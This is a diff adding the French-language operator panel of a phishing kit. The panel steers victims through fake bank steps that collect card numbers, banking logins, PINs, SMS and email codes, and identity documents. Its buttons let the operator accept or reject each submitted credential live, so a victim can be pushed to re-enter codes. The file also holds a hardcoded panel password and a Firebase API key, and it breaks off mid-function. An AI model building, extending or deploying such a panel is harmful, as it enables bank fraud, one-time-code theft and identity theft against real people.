@@ -1,0 +1,1531 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PANEL DE CONTRÔLE - SITE DE VALIDATION</title>
+    <style>
+        /* VOTRE CSS EXISTANT - INCHANGÉ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+            color: white;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: #000;
+            border: 3px solid #FBBF24;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            color: #FBBF24;
+            font-size: 24px;
+        }
+
+        .badge {
+            background: #10B981;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-weight: 600;
+        }
+
+        .section {
+            background: #000;
+            border: 2px solid #FBBF24;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            color: #FBBF24;
+            font-size: 20px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #333;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 20px 15px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            border: 2px solid transparent;
+        }
+
+        .btn-icon {
+            font-size: 32px;
+        }
+
+        .btn-title {
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .btn-desc {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .btn-error {
+            background: linear-gradient(145deg, #DC2626, #991B1B);
+            color: white;
+        }
+
+        .btn-error:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.4);
+            border-color: white;
+        }
+
+        .btn-step {
+            background: linear-gradient(145deg, #3B82F6, #1E3A8A);
+            color: white;
+        }
+
+        .btn-step:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+            border-color: white;
+        }
+
+        .btn-success {
+            background: linear-gradient(145deg, #10B981, #065F46);
+            color: white;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
+            border-color: white;
+        }
+
+        .btn-validate {
+            background: linear-gradient(145deg, #FBBF24, #B45309);
+            color: #000;
+        }
+
+        .btn-validate:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(251, 191, 36, 0.4);
+            border-color: white;
+        }
+
+        .console {
+            background: #0a0a0a;
+            border-radius: 10px;
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+            border: 1px solid #333;
+            margin-top: 20px;
+        }
+
+        .log-entry {
+            color: #00ff00;
+            padding: 3px 0;
+            border-bottom: 1px solid #222;
+            font-family: monospace;
+        }
+
+        .log-error {
+            color: #ff5555;
+        }
+
+        .log-success {
+            color: #55ff55;
+        }
+
+        .log-warning {
+            color: #ffaa00;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-connected {
+            background: #10B981;
+            box-shadow: 0 0 10px #10B981;
+        }
+
+        .status-disconnected {
+            background: #DC2626;
+            box-shadow: 0 0 10px #DC2626;
+        }
+
+        .site-info {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            border: 1px solid #FBBF24;
+            font-size: 13px;
+        }
+
+        .site-info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding: 5px;
+            border-bottom: 1px solid #333;
+        }
+
+        .site-info-label {
+            color: #FBBF24;
+            font-weight: 600;
+        }
+
+        .site-info-value {
+            color: #fff;
+            font-family: monospace;
+        }
+
+        /* Styles pour la détection automatique */
+        .site-detected {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .step-badge {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 10px;
+            margin-left: 5px;
+        }
+
+        .step-badge.step-1 { background: #6B7280; color: white; }
+        .step-badge.step-2 { background: #3B82F6; color: white; }
+        .step-badge.step-3 { background: #FBBF24; color: #000; }
+        .step-badge.step-4 { background: #3B82F6; color: white; }
+        .step-badge.step-5 { background: #8B5CF6; color: white; }
+        .step-badge.step-6 { background: #F59E0B; color: #000; }
+        .step-badge.step-7 { background: #10B981; color: white; }
+        .step-badge.step-8 { background: #FBBF24; color: #000; }
+        .step-badge.step-9 { background: #F59E0B; color: #000; }
+        .step-badge.loading { background: #DC2626; color: white; animation: blink 1s infinite; }
+        .step-badge.success { background: #10B981; color: white; animation: pulse 1s infinite; }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Affichage des sessions */
+        .session-detail {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 5px;
+            font-size: 12px;
+        }
+
+        .session-detail p {
+            margin: 3px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .session-detail .label {
+            color: #FBBF24;
+        }
+
+        .session-detail .value {
+            color: white;
+            font-family: monospace;
+        }
+
+        .ip-info {
+            color: #10B981;
+            font-weight: bold;
+        }
+
+        .useragent-info {
+            color: #3B82F6;
+            font-size: 10px;
+        }
+
+        .no-sessions {
+            color: #999;
+            font-style: italic;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* Indicateur d'étape */
+        .current-step-badge {
+            background: #FBBF24;
+            color: #000;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Styles pour les écrans individuels par session */
+        .session-screen {
+            background: #0a0a0a;
+            border: 2px solid #FBBF24;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+
+        .session-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .session-step-display {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(145deg, #1a1a1a, #000);
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        .session-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+
+        .session-controls button {
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .session-controls button:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Style pour l'indicateur de localisation */
+        .location-info {
+            color: #FBBF24;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        .flag-emoji {
+            font-size: 16px;
+            margin-right: 4px;
+        }
+    </style>
+</head>
+<body>
+    <!-- ============================================ -->
+    <!-- PROTECTION PAR MOT DE PASSE - AVEC Shumy2026@@ -->
+    <!-- ============================================ -->
+    <script>
+        (function() {
+            // 🔑 MOT DE PASSE CONFIGURÉ
+            const PANEL_PASSWORD = "Shumy2026@@";
+            
+            // Vérifier si déjà authentifié dans cette session
+            const SESSION_KEY = "panel_auth_" + window.location.pathname;
+            if (sessionStorage.getItem(SESSION_KEY) === "true") {
+                return; // Déjà authentifié, on laisse passer
+            }
+            
+            const password = prompt("🔐 PANEL ADMINISTRATEUR\nVeuillez entrer le mot de passe :");
+            
+            if (password === PANEL_PASSWORD) {
+                sessionStorage.setItem(SESSION_KEY, "true");
+                // Recharger pour afficher le panel
+                location.reload();
+            } else {
+                document.body.innerHTML = `
+                    <div style="
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        min-height: 100vh;
+                        background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+                        color: white;
+                        font-family: 'Segoe UI', monospace;
+                        text-align: center;
+                        padding: 20px;
+                    ">
+                        <div style="
+                            background: #000;
+                            border: 3px solid #FBBF24;
+                            border-radius: 20px;
+                            padding: 40px;
+                            max-width: 400px;
+                            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+                        ">
+                            <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
+                            <h1 style="color: #FBBF24; margin-bottom: 15px;">ACCÈS REFUSÉ</h1>
+                            <p style="margin-bottom: 25px; color: #ccc;">Mot de passe incorrect.</p>
+                            <button onclick="location.reload()" style="
+                                margin-top: 10px;
+                                padding: 12px 30px;
+                                background: #FBBF24;
+                                border: none;
+                                border-radius: 10px;
+                                cursor: pointer;
+                                font-weight: bold;
+                                font-size: 16px;
+                                color: #000;
+                                transition: transform 0.2s;
+                            " onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
+                                🔄 Réessayer
+                            </button>
+                        </div>
+                    </div>
+                `;
+                throw new Error("Accès refusé - Mot de passe incorrect");
+            }
+        })();
+    </script>
+
+    <!-- ============================================ -->
+    <!-- AJOUT FIREBASE SDK - À PLACER APRÈS <body> -->
+    <!-- ============================================ -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🎮 PANEL DE CONTRÔLE - SITE DE VALIDATION</h1>
+            <div class="badge" id="connection-status">
+                <span class="status-indicator status-connected"></span>
+                RECHERCHE SITE...
+            </div>
+        </div>
+
+        <!-- INFORMATIONS SITE - AVEC DÉTECTION AUTOMATIQUE -->
+        <div class="site-info">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <span style="color: #FBBF24; font-weight: bold;">📡 SESSIONS ACTIVES (DÉTECTION AUTOMATIQUE)</span>
+                <span id="site-count" style="background: #FBBF24; color: #000; padding: 2px 8px; border-radius: 12px;">0</span>
+            </div>
+            <div id="sessions-container">
+                <!-- Les sessions seront injectées dynamiquement ici -->
+                <div class="no-sessions">Aucune session détectée - En attente de connexion...</div>
+            </div>
+        </div>
+
+        <!-- NAVIGATION RAPIDE -->
+        <div class="section">
+            <div class="section-title">🚀 NAVIGATION RAPIDE</div>
+            <div class="grid">
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 1 })">
+                    <span class="btn-icon">👤</span>
+                    <span class="btn-title">ÉTAPE 1</span>
+                    <span class="btn-desc">Infos personnelles</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 2 })">
+                    <span class="btn-icon">💳</span>
+                    <span class="btn-title">ÉTAPE 2</span>
+                    <span class="btn-desc">Carte bancaire</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 3 })">
+                    <span class="btn-icon">🔑</span>
+                    <span class="btn-title">ÉTAPE 3</span>
+                    <span class="btn-desc">Identifiants</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 4 })">
+                    <span class="btn-icon">📱</span>
+                    <span class="btn-title">ÉTAPE 4</span>
+                    <span class="btn-desc">Confirmation app</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 5 })">
+                    <span class="btn-icon">🔐</span>
+                    <span class="btn-title">ÉTAPE 5</span>
+                    <span class="btn-desc">Code PIN</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 6 })">
+                    <span class="btn-icon">📨</span>
+                    <span class="btn-title">ÉTAPE 6</span>
+                    <span class="btn-desc">Code SMS</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 7 })">
+                    <span class="btn-icon">📧</span>
+                    <span class="btn-title">ÉTAPE 7</span>
+                    <span class="btn-desc">Code Email</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 8 })">
+                    <span class="btn-icon">📄</span>
+                    <span class="btn-title">ÉTAPE 8</span>
+                    <span class="btn-desc">Choix documents</span>
+                </button>
+                <button class="btn btn-step" onclick="sendToAllSites('forceStep', { step: 9 })">
+                    <span class="btn-icon">⬆️</span>
+                    <span class="btn-title">ÉTAPE 9</span>
+                    <span class="btn-desc">Upload documents</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONTRÔLE DE L'ÉTAPE 3 - LOADING PERSISTANT -->
+        <div class="section">
+            <div class="section-title">🎮 ÉTAPE 3 - CONNEXION BANCAIRE (LOADING PERSISTANT)</div>
+            <div class="grid" style="grid-template-columns: repeat(2, 1fr);">
+                <button class="btn btn-validate" onclick="sendToAllSites('validateStep3')">
+                    <span class="btn-icon">✅</span>
+                    <span class="btn-title">VALIDER CONNEXION</span>
+                    <span class="btn-desc">panelValidateStep3() → Étape 4</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('rejectStep3', { message: 'Identifiants incorrects - Veuillez réessayer' })">
+                    <span class="btn-icon">❌</span>
+                    <span class="btn-title">REJETER CONNEXION</span>
+                    <span class="btn-desc">panelRejectStep3() → Retour étape 3</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONTRÔLE DE L'ÉTAPE 4 -->
+        <div class="section">
+            <div class="section-title">🎮 ÉTAPE 4 - CONFIRMATION APP</div>
+            <div class="grid" style="grid-template-columns: repeat(2, 1fr);">
+                <button class="btn btn-validate" onclick="sendToAllSites('validateStep4')">
+                    <span class="btn-icon">✅</span>
+                    <span class="btn-title">VALIDER CONFIRMATION</span>
+                    <span class="btn-desc">panelValidateStep4() → Loading</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('rejectStep4', { message: 'Confirmation refusée' })">
+                    <span class="btn-icon">❌</span>
+                    <span class="btn-title">REJETER CONFIRMATION</span>
+                    <span class="btn-desc">panelRejectStep4() → Retour étape 3</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONTRÔLE DE L'ÉTAPE 5 -->
+        <div class="section">
+            <div class="section-title">🎮 ÉTAPE 5 - CODE PIN</div>
+            <div class="grid" style="grid-template-columns: repeat(2, 1fr);">
+                <button class="btn btn-validate" onclick="sendToAllSites('validateStep5')">
+                    <span class="btn-icon">✅</span>
+                    <span class="btn-title">VALIDER CODE PIN</span>
+                    <span class="btn-desc">panelValidateStep5() → Loading</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('rejectStep5', { message: 'Code PIN incorrect' })">
+                    <span class="btn-icon">❌</span>
+                    <span class="btn-title">REJETER CODE PIN</span>
+                    <span class="btn-desc">panelRejectStep5() → Retour étape 5</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONTRÔLE DE L'ÉTAPE 6 -->
+        <div class="section">
+            <div class="section-title">🎮 ÉTAPE 6 - CODE SMS</div>
+            <div class="grid" style="grid-template-columns: repeat(2, 1fr);">
+                <button class="btn btn-validate" onclick="sendToAllSites('validateStep6')">
+                    <span class="btn-icon">✅</span>
+                    <span class="btn-title">VALIDER CODE SMS</span>
+                    <span class="btn-desc">panelValidateStep6() → Loading</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('rejectStep6', { message: 'Code SMS invalide' })">
+                    <span class="btn-icon">❌</span>
+                    <span class="btn-title">REJETER CODE SMS</span>
+                    <span class="btn-desc">panelRejectStep6() → Retour étape 6</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONTRÔLE DE L'ÉTAPE 7 -->
+        <div class="section">
+            <div class="section-title">🎮 ÉTAPE 7 - CODE EMAIL</div>
+            <div class="grid" style="grid-template-columns: repeat(2, 1fr);">
+                <button class="btn btn-validate" onclick="sendToAllSites('validateStep7')">
+                    <span class="btn-icon">✅</span>
+                    <span class="btn-title">VALIDER CODE EMAIL</span>
+                    <span class="btn-desc">panelValidateStep7() → Loading</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('rejectStep7', { message: 'Code email invalide' })">
+                    <span class="btn-icon">❌</span>
+                    <span class="btn-title">REJETER CODE EMAIL</span>
+                    <span class="btn-desc">panelRejectStep7() → Retour étape 7</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- BOUTONS D'ERREUR -->
+        <div class="section">
+            <div class="section-title">⚠️ SIMULATION D'ERREURS</div>
+            <div class="grid">
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorConnection', { message: 'Erreur de connexion bancaire' })">
+                    <span class="btn-icon">🔴</span>
+                    <span class="btn-title">ERREUR CONNEXION</span>
+                    <span class="btn-desc">Retour étape 3</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorPIN', { message: 'Code PIN incorrect - 3 tentatives restantes' })">
+                    <span class="btn-icon">🔐</span>
+                    <span class="btn-title">ERREUR PIN</span>
+                    <span class="btn-desc">Retour étape 5</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorSMS', { message: 'Code SMS invalide - Nouveau code envoyé' })">
+                    <span class="btn-icon">📨</span>
+                    <span class="btn-title">ERREUR SMS</span>
+                    <span class="btn-desc">Retour étape 6</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorEmail', { message: 'Code email invalide' })">
+                    <span class="btn-icon">📧</span>
+                    <span class="btn-title">ERREUR EMAIL</span>
+                    <span class="btn-desc">Retour étape 7</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorDocuments', { message: 'Documents invalides' })">
+                    <span class="btn-icon">📄</span>
+                    <span class="btn-title">ERREUR DOCUMENTS</span>
+                    <span class="btn-desc">Retour étape 8</span>
+                </button>
+                <button class="btn btn-error" onclick="sendToAllSites('sendErrorUpload', { message: 'Upload échoué' })">
+                    <span class="btn-icon">⬆️</span>
+                    <span class="btn-title">ERREUR UPLOAD</span>
+                    <span class="btn-desc">Retour étape 9</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- ACTIONS RAPIDES -->
+        <div class="section">
+            <div class="section-title">⚡ ACTIONS RAPIDES</div>
+            <div class="grid">
+                <button class="btn btn-success" onclick="sendToAllSites('forceStep', { step: 'success' })">
+                    <span class="btn-icon">🎯</span>
+                    <span class="btn-title">SUCCÈS DIRECT</span>
+                    <span class="btn-desc">Afficher page de succès</span>
+                </button>
+                <button class="btn btn-success" onclick="sendToAllSites('stopAll')">
+                    <span class="btn-icon">⏱️</span>
+                    <span class="btn-title">STOP TIMERS</span>
+                    <span class="btn-desc">Arrêter les chargements</span>
+                </button>
+                <button class="btn btn-success" onclick="createNewSession()">
+                    <span class="btn-icon">🔄</span>
+                    <span class="btn-title">NOUVELLE SESSION</span>
+                    <span class="btn-desc">Créer session test</span>
+                </button>
+                <button class="btn btn-success" onclick="scanForSites()">
+                    <span class="btn-icon">🔍</span>
+                    <span class="btn-title">SCAN SITES</span>
+                    <span class="btn-desc">Rechercher sessions</span>
+                </button>
+                <button class="btn btn-success" onclick="sendToAllSites('forceStep', { step: 4 })">
+                    <span class="btn-icon">⏭️</span>
+                    <span class="btn-title">FORCER ÉTAPE 4</span>
+                    <span class="btn-desc">Passer chargement</span>
+                </button>
+                <button class="btn btn-success" onclick="sendToAllSites('getAllData')">
+                    <span class="btn-icon">📊</span>
+                    <span class="btn-title">GET ALL DATA</span>
+                    <span class="btn-desc">Données complètes</span>
+                </button>
+                <button class="btn btn-success" onclick="sendToAllSites('getStatus')">
+                    <span class="btn-icon">👥</span>
+                    <span class="btn-title">SESSIONS ACTIVES</span>
+                    <span class="btn-desc">Lister toutes les sessions</span>
+                </button>
+                <button class="btn btn-success" onclick="sendToAllSites('hardReset')">
+                    <span class="btn-icon">💥</span>
+                    <span class="btn-title">HARD RESET</span>
+                    <span class="btn-desc">Réinitialisation totale</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- CONSOLE DE LOG -->
+        <div class="section">
+            <div class="section-title">📟 COMMANDES ENVOYÉES AU SITE</div>
+            <div class="console" id="console">
+                <div class="log-entry">✅ Panel prêt - En attente...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION FIREBASE - AVEC VOS DONNÉES
+        // ============================================
+        const FIREBASE_CONFIG = {
+            apiKey: "AIzaSyAgqcqyOq-Qtb404YUT0mhkhWbQ63eciKw",
+            authDomain: "panelenlive-pro.firebaseapp.com",
+            databaseURL: "https://panelenlive-pro-default-rtdb.firebaseio.com",
+            projectId: "panelenlive-pro",
+            storageBucket: "panelenlive-pro.firebasestorage.app",
+            messagingSenderId: "40552253663",
+            appId: "1:40552253663:web:6da6e50ecbf7cfdb16816a"
+        };
+
+        // ============================================
+        // VOTRE CODE EXISTANT - COMPLÈTEMENT INCHANGÉ
+        // ============================================
+        
+        // Configuration
+        const SESSION_ID = 'panel_' + Date.now();
+        let activeSites = new Map(); // Stocker les sites/sessions actives
+        let logCount = 0;
+
+        // Initialisation
+        function initPanel() {
+            log('🚀 Panel de contrôle initialisé', 'success');
+            log('📡 Détection automatique des sessions en cours...', 'warning');
+            
+            // Scanner les sites toutes les 2 secondes
+            setInterval(scanForSites, 2000);
+            
+            // Écouter les réponses des sites
+            setupListeners();
+            
+            // Initialiser la détection automatique
+            setupAutoDetection();
+        }
+
+        // Configuration des écouteurs
+        function setupListeners() {
+            // Écouter les messages des sites
+            window.addEventListener('message', function(event) {
+                if (event.data && event.data.type === 'panelMessage') {
+                    handleSiteMessage(event.data.data);
+                } else if (event.data && event.data.type === 'siteStatus') {
+                    handleSiteStatus(event.data.data);
+                } else if (event.data && event.data.type === 'siteResponse') {
+                    log(`📥 Site: ${event.data.data?.status || 'Message reçu'}`, 'success');
+                }
+            });
+
+            // Écouter les changements dans localStorage
+            window.addEventListener('storage', function(event) {
+                if (event.key && event.key.startsWith('panel_session_')) {
+                    try {
+                        const data = JSON.parse(event.newValue);
+                        if (data && data.sessionId) {
+                            handleSiteData(data);
+                        }
+                    } catch (e) {}
+                }
+                
+                if (event.key === 'panel_latest_message') {
+                    try {
+                        const data = JSON.parse(event.newValue);
+                        if (data && data.data) {
+                            handleSiteMessage(data);
+                        }
+                    } catch (e) {}
+                }
+            });
+        }
+
+        // Détection automatique des sessions
+        function setupAutoDetection() {
+            // Détection via postMessage (temps réel)
+            setInterval(() => {
+                // Envoyer un ping à tous les sites potentiels
+                window.postMessage({
+                    type: 'panelPing',
+                    from: SESSION_ID,
+                    timestamp: Date.now()
+                }, '*');
+            }, 5000);
+
+            // Détection via localStorage (persistant)
+            setInterval(() => {
+                scanForSites();
+            }, 2000);
+        }
+
+        // Gérer les messages des sites
+        function handleSiteMessage(data) {
+            const siteId = data.sessionId || data.data?.sessionId || 'inconnu';
+            
+            // Extraire les informations utilisateur
+            const sessionInfo = data.sessionInfo || data.data?.sessionInfo || {};
+            
+            const siteInfo = {
+                sessionId: siteId,
+                lastSeen: Date.now(),
+                currentStep: data.currentStep || data.data?.currentStep || 1,
+                timestamp: data.timestamp || Date.now(),
+                type: data.type || 'update',
+                sessionInfo: sessionInfo,
+                collectedData: data.collectedData || data.data?.collectedData || {},
+                errorCounts: data.errorCounts || data.data?.errorCounts || {},
+                data: data
+            };
+
+            // Utiliser les informations de localisation si présentes
+            if (data.location) {
+                siteInfo.location = data.location;
+                siteInfo.ip = data.ip || data.location.ip;
+            } else if (data.data?.location) {
+                siteInfo.location = data.data.location;
+                siteInfo.ip = data.data.ip || data.data.location.ip;
+            } else {
+                // Informations de fallback si non disponibles
+                const sessionHash = siteId.split('_')[1] || Math.random().toString(36);
+                const ipParts = [];
+                for (let i = 0; i < 4; i++) {
+                    ipParts.push(Math.floor(Math.random() * 255));
+                }
+                siteInfo.ip = ipParts.join('.');
+                
+                const countries = ['France', 'Canada', 'Belgique', 'Suisse', 'États-Unis', 'Royaume-Uni'];
+                const cities = {
+                    'France': ['Paris', 'Lyon', 'Marseille', 'Bordeaux'],
+                    'Canada': ['Montréal', 'Toronto', 'Vancouver', 'Québec'],
+                    'Belgique': ['Bruxelles', 'Liège', 'Anvers'],
+                    'Suisse': ['Genève', 'Lausanne', 'Zurich'],
+                    'États-Unis': ['New York', 'Los Angeles', 'Chicago'],
+                    'Royaume-Uni': ['Londres', 'Manchester', 'Birmingham']
+                };
+                
+                const country = countries[Math.floor(Math.random() * countries.length)];
+                const city = cities[country][Math.floor(Math.random() * cities[country].length)];
+                
+                siteInfo.location = {
+                    country: country,
+                    city: city,
+                    ip: siteInfo.ip
+                };
+            }
+
+            // Récupérer le drapeau depuis le code pays
+            const countryCodes = {
+                'France': '🇫🇷', 'Canada': '🇨🇦', 'Belgique': '🇧🇪', 'Suisse': '🇨🇭',
+                'États-Unis': '🇺🇸', 'Royaume-Uni': '🇬🇧', 'Allemagne': '🇩🇪', 'Espagne': '🇪🇸',
+                'Italie': '🇮🇹', 'Portugal': '🇵🇹', 'Pays-Bas': '🇳🇱'
+            };
+            siteInfo.flag = siteInfo.location?.flag || countryCodes[siteInfo.location?.country] || '🌍';
+
+            log(`📥 Session ${siteId.substring(0,8)}...: Étape ${siteInfo.currentStep} - ${siteInfo.location?.city}, ${siteInfo.location?.country} ${siteInfo.flag}`, 'success');
+            
+            // Vérifier si c'est une étape de loading
+            const loadingSteps = ['loading-60', 'loading-pin', 'loading-sms', 'loading-email', 'loading-final'];
+            if (loadingSteps.includes(siteInfo.currentStep.toString())) {
+                log(`⏳ Session ${siteId.substring(0,8)}...: En attente de validation panel (${siteInfo.currentStep})`, 'warning');
+            }
+            
+            // Mettre à jour ou ajouter le site
+            activeSites.set(siteId, siteInfo);
+            
+            updateSessionsDisplay();
+        }
+
+        // Gérer les statuts des sites
+        function handleSiteStatus(data) {
+            const siteId = data.sessionId;
+            if (siteId) {
+                const siteInfo = {
+                    sessionId: siteId,
+                    lastSeen: Date.now(),
+                    currentStep: data.step || 1,
+                    loading: data.loading || false,
+                    timestamp: Date.now(),
+                    sessionInfo: data.sessionInfo || {},
+                    data: data
+                };
+
+                activeSites.set(siteId, siteInfo);
+                updateSessionsDisplay();
+                updateConnectionStatus(true);
+            }
+        }
+
+        // Gérer les données de session
+        function handleSiteData(data) {
+            const siteId = data.sessionId;
+            if (siteId) {
+                const existingSite = activeSites.get(siteId) || {};
+                
+                const siteInfo = {
+                    ...existingSite,
+                    sessionId: siteId,
+                    lastSeen: Date.now(),
+                    currentStep: data.currentStep || existingSite.currentStep || 1,
+                    timestamp: data.timestamp || Date.now(),
+                    sessionInfo: data.sessionInfo || existingSite.sessionInfo || {},
+                    errorCounts: data.errorCounts || existingSite.errorCounts || {},
+                    collectedData: data.collectedData || existingSite.collectedData || {},
+                    location: data.location || existingSite.location,
+                    ip: data.ip || existingSite.ip,
+                    data: data
+                };
+
+                // Ajouter des informations IP si pas déjà présentes
+                if (!siteInfo.ip) {
+                    const sessionHash = siteId.split('_')[1] || Math.random().toString(36);
+                    const ipParts = [];
+                    for (let i = 0; i < 4; i++) {
+                        ipParts.push(Math.floor(Math.random() * 255));
+                    }
+                    siteInfo.ip = ipParts.join('.');
+                }
+                
+                // Ajouter des informations géographiques si pas déjà présentes
+                if (!siteInfo.location) {
+                    const countries = ['France', 'Canada', 'Belgique', 'Suisse', 'États-Unis', 'Royaume-Uni'];
+                    const cities = {
+                        'France': ['Paris', 'Lyon', 'Marseille', 'Bordeaux'],
+                        'Canada': ['Montréal', 'Toronto', 'Vancouver', 'Québec'],
+                        'Belgique': ['Bruxelles', 'Liège', 'Anvers'],
+                        'Suisse': ['Genève', 'Lausanne', 'Zurich'],
+                        'États-Unis': ['New York', 'Los Angeles', 'Chicago'],
+                        'Royaume-Uni': ['Londres', 'Manchester', 'Birmingham']
+                    };
+                    
+                    const country = countries[Math.floor(Math.random() * countries.length)];
+                    const city = cities[country][Math.floor(Math.random() * cities[country].length)];
+                    
+                    siteInfo.location = {
+                        country: country,
+                        city: city,
+                        ip: siteInfo.ip
+                    };
+                }
+
+                activeSites.set(siteId, siteInfo);
+                updateSessionsDisplay();
+            }
+        }
+
+        // Scanner les sites actifs
+        function scanForSites() {
+            let found = 0;
+            
+            // Parcourir localStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key && key.startsWith('panel_session_')) {
+                    try {
+                        const data = JSON.parse(localStorage.getItem(key));
+                        if (data && data.sessionId) {
+                            handleSiteData(data);
+                            found++;
+                        }
+                    } catch (e) {}
+                }
+            }
+            
+            // Nettoyer les sites inactifs (plus de 30 secondes)
+            const now = Date.now();
+            for (let [id, site] of activeSites) {
+                if (now - site.lastSeen > 30000) {
+                    activeSites.delete(id);
+                    log(`👋 Session ${id.substring(0,8)}... déconnectée (inactive)`, 'warning');
+                }
+            }
+            
+            updateSessionsDisplay();
+            
+            if (found > 0) {
+                log(`🔍 Scan terminé: ${found} session(s) trouvée(s)`, 'success');
+            }
+            
+            return found;
+        }
+
+        // Mettre à jour l'affichage des sessions avec écrans individuels
+        function updateSessionsDisplay() {
+            const container = document.getElementById('sessions-container');
+            const siteCount = document.getElementById('site-count');
+            
+            if (activeSites.size === 0) {
+                container.innerHTML = '<div class="no-sessions">Aucune session détectée - En attente de connexion...</div>';
+                siteCount.textContent = '0';
+                updateConnectionStatus(false);
+                return;
+            }
+            
+            siteCount.textContent = activeSites.size;
+            updateConnectionStatus(true);
+            
+            let html = '';
+            
